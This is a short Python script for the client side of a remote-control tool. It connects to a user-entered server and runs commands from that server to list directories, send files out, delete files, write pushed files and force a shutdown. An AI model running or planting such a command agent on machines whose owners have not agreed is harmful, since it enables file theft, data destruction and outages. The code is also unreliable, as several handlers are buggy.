#Command list
# view_cwd - will show all files in the directory where the file is running
# custom_dir - will show all files from custom directory
# download_files - will download files from directory
# remove_files - will remove file from directory
# send_files - will send file to directory

import os
import socket

s = socket.socket()
port=9999
host = input (str("Please enter the server address : "))
s.connect((host,port))
print("")
print("Connected to the server succesfully")
print("")

# connection has been completed

#command recieving and execution
while 1:
    command = s.recv(1024)
    command = command.decode()
    print("Command recieved")
    print("")
    if command == "view_cwd":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print("Command has been executed successfully..")

    elif command == "custom_dir":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        print("")
        print("Command has been executed successfully..")
        print("")

    elif command == "download_files":
        file_path = s.recv(5000)
        file_path = file_path.decode()
        file = open(file_path, "rb")
        data = file.read()
        s.send(data.decode())
        print("")
        print("File has been sent successfully")
        print("")
    
    elif command == "remove_files":
        fileanddir = s.recv(6000)
        fileanddir = fileanddir.decode()
        os.remove(fileanddir)
        print("")
        print("Command has been executed successfully")
        print("")

    elif command == "send_files":
        filename = s.recv(6000)
        print(filename)
        new_file = open(filename, "wb")
        data = s.recv(6000) #change when file is too big
        print(data)
        new_file.write(data)
        new_file.close()

    elif command == "shutdown":
        os.system("shutdown -s -f")

    else:
        print("")
        print("Command not recognized")    
        